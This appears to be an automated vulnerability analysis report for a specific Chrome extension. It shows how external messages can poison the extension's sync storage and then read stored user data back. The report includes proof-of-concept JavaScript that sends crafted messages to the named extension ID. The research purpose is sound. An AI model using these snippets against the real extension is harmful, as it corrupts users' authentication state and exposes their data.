# CoCo Analysis: gajdaifefkkhmmohnkkdcblongmhcdac

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gajdaifefkkhmmohnkkdcblongmhcdac/opgen_generated_files/bg.js
Line 983: `chrome.storage.sync.set({ user: message.user }, () => {`

**Code:**

```javascript
// Background script - Message handler (bg.js Line 977-1013)
chrome.runtime.onMessageExternal.addListener((message, sender, sendResponse) => {
  if (message.type === 'authSuccess') {
    const { user, token, expires_in } = message; // ← attacker-controlled
    const token_expiry = Math.floor(Date.now() / 1000) + expires_in;

    // Store the user object in sync storage
    chrome.storage.sync.set({ user: message.user }, () => { // ← sink
      sendResponse({ status: 'success' });
      chrome.runtime.sendMessage({
        action: "updateLoginStatus",
        isLoggedIn: true,
        userInfo: message.user, // ← attacker-controlled data
      });
    });

    chrome.storage.local.set({ token: token, email: user.email, token_expiry: token_expiry }, () => {
    });

    return true;
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From whitelisted domains (redphish.app or herokuapp.com) OR other extensions
chrome.runtime.sendMessage(
  'gajdaifefkkhmmohnkkdcblongmhcdac', // extension ID
  {
    type: 'authSuccess',
    user: { malicious: 'data', admin: true },
    token: 'fake-token',
    expires_in: 3600
  },
  function(response) {
    console.log('Storage poisoned:', response);
  }
);
```

**Impact:** Storage poisoning - attacker can inject arbitrary data into chrome.storage.sync, which is then broadcast to popup via chrome.runtime.sendMessage. This poisoned data affects extension state and user authentication status.

---

## Sink 2: storage_sync_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gajdaifefkkhmmohnkkdcblongmhcdac/opgen_generated_files/bg.js
Line 1005: `if (data.user) {`
Line 1007: `sendResponse({ isLoggedIn: true, userInfo: data.user });`

**Code:**

```javascript
// Background script - Message handler (bg.js Line 1003-1013)
chrome.runtime.onMessageExternal.addListener((message, sender, sendResponse) => {
  // ... previous code ...
  if (message.type === 'checkAuth') {
    chrome.storage.sync.get('user', (data) => { // ← retrieve potentially poisoned data
      if (data.user) {
        sendResponse({ isLoggedIn: true, userInfo: data.user }); // ← leak stored data to external caller
      } else {
        sendResponse({ isLoggedIn: false });
      }
    });
    return true;
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Message (chrome.runtime.onMessageExternal) - Complete Storage Exploitation Chain

**Attack:**

```javascript
// Step 1: Poison storage (from Sink 1)
chrome.runtime.sendMessage(
  'gajdaifefkkhmmohnkkdcblongmhcdac',
  {
    type: 'authSuccess',
    user: { admin: true, token: 'stolen' },
    token: 'fake',
    expires_in: 3600
  }
);

// Step 2: Retrieve poisoned data
chrome.runtime.sendMessage(
  'gajdaifefkkhmmohnkkdcblongmhcdac',
  { type: 'checkAuth' },
  function(response) {
    console.log('Retrieved data:', response.userInfo); // Contains poisoned data
  }
);
```

**Impact:** Complete storage exploitation chain - attacker can both write arbitrary data to storage (Sink 1) AND retrieve stored data back (Sink 2), including legitimate user information. This allows for information disclosure of user authentication data and manipulation of extension state.

---

## Overall Vulnerability Assessment

This extension has TWO TRUE POSITIVE vulnerabilities forming a complete bidirectional attack:

1. **Storage Poisoning:** External messages can inject arbitrary user/auth data into chrome.storage.sync
2. **Information Disclosure:** External messages can retrieve all stored user data via sendResponse

The combination allows an attacker (from whitelisted domains or other extensions) to:
- Poison user authentication state
- Exfiltrate legitimate user credentials and tokens
- Manipulate extension behavior through corrupted state

Both flows are externally triggerable via `chrome.runtime.onMessageExternal`, the extension has the required `storage` permission, and the attack path is fully executable.
